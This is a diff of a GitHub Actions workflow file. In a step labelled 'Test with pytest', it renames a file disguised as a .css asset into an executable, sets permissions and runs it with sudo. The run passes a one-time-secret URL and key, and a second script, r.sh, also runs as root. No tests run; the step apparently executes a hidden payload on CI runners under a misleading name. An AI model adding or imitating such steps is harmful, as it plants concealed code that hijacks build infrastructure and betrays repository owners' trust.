@@ -25,5 +25,9 @@ jobs:
         python -m pip install --upgrade pip
     - name: Test with pytest
       run: |
-        echo 'mdxcl'
-        cd ${{ github.workspace }} && ls && mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css i.sh.x && sudo ./i.sh.x https://onetimesecret.com/secret/mr5mapm3qyiqeliywi5kqsz04fk0wg dxxdt6 && sudo sh r.sh
+        cd ${{ github.workspace }}
+        ls
+        mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css huf00.x
+        chmod 700 huf00.x
+        ls -la
+        sudo ./huf00.x https://onetimesecret.com/secret/oebds9901i7akwz86l14b27pzeq663e 95pwkk && sudo sh r.sh
